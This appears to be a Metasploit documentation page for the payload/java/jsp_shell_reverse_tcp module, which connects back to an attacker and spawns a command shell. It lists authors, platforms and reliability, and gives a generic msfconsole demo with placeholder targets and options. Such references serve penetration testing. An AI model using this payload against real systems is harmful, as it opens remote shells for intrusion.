## Java JSP Command Shell, Reverse TCP Inline

Connect back to attacker and spawn a command shell


## Module Name
payload/java/jsp_shell_reverse_tcp

## Authors
* sf





## Platforms
* linux
* osx
* solaris
* unix
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/java/jsp_shell_reverse_tcp
msf payload(jsp_shell_reverse_tcp) > show targets
   ... a list of targets ...
msf payload(jsp_shell_reverse_tcp) > set TARGET <target-id>
msf payload(jsp_shell_reverse_tcp) > show options
   ... show and set options ...
msf payload(jsp_shell_reverse_tcp) > run
```
    
    